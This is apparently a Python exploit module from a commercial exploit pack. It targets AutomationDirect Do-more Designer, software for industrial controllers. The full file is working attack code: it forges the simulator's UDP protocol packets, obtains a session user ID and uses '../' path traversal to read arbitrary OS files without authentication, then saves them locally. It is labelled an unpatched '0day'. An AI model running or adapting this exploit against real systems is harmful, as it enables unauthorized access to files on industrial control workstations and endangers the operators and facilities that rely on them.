#!/usr/bin/env python

import socket
import struct
import cStringIO
import time
from string import ascii_uppercase
from collections import OrderedDict
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_DoMore_Designer_afd"
INFO['DESCRIPTION'] = "AutomationDirect Do-more Designer Arbitrary File Disclosure"
INFO['VENDOR'] = "https://www.automationdirect.com/do-more/index"
INFO["CVE Name"] = "0day"
INFO["DOWNLOAD_LINK"] = "https://support.automationdirect.com/products/domore.html"
INFO["LINKS"] = []
INFO['CHANGELOG'] = "9 Aug, 2018. Written by Gleg team."
INFO['PATH'] = "General/"
INFO["NOTES"] = """
    Do-more Simulator allows remote attacker to read OS files using '../' combination.
Authentication is not required.
Tested against Do-more Designer 2.3.2 on Windows 7 SP1 x64.
"""

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.0.15"
OPTIONS["PORT"] = 28784
OPTIONS["FILE"] = "Windows/win.ini"


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.filename = str(self.args.get("FILE", OPTIONS["FILE"]))

    def send(self, data):
        self.s.send(str(data))
        self.s.recv(4096)
        res = self.s.recv(4096)
        return res

    def xmodem_crc_16(self, block):
        crc = 0
        for b in block:
            crc = crc ^ (ord(b) << 8)
            for i in range(8):
                if crc & 0x8000:
                    crc = (crc << 1) ^ 0x1021
                else:
                    crc = crc << 1
        return "%c%c" % (crc & 0xFF, (crc >> 8) & 0xFF)

    def make_data(self, part1, part2):
        subdata = '\x00\x1d\x00' + struct.pack('B', len(part2) - 1) + "\x00\x3e" + part2
        data = part1 + self.xmodem_crc_16(subdata) + struct.pack('B', len(subdata) - 1) + subdata
        res = self.send(data)
        return res

    def read_file(self, filename, user_id):
        self.make_data("\x48\x41\x50\x8b\x76", user_id + "\x02\x01\x00\\" + filename + "\x00")
        res = self.make_data("\x48\x41\x50\x11\x76", user_id + "\x0c")
        fd = res[-4:]
        buffer = []
        while 1:
            self.make_data("\x48\x41\x50\x12\xc3", user_id + "\x05\x01" + fd + "\xb6\x03")
            res = self.make_data("\x48\x41\x50\x11\x76", user_id + "\x0c")
            if len(res) == 17:
                break
            buffer.append(res[17:])
        return ''.join(buffer)


    def run(self):
        #Get options from gui
        self.args()
        self.log("[*] Trying to connect to %s:%s" % (self.host, self.port))
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((self.host, self.port))
        self.s = s
        self.log('[*] Trying to read %s' % self.filename)
        res = self.send(
            "\x48\x41\x50\x1f\x76\x39\xc9\x0f\x00\x1d\x00\x0b\x00\x04\x00\x00"
            "\x00\x00\x00\x00\x00\x00\x00\x00"
        )
        user_id = str(res[14:16])
        self.make_data("\x48\x41\x50\x3c\x76", user_id + "\x01")

        content = self.read_file('../'*8 + self.filename, user_id)
        self.writefile(content, self.filename.replace('\\', '/').split('/').pop())
        if len(content) < 10000:
            self.log("\r\n" + content)
        self.finish(True)

if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()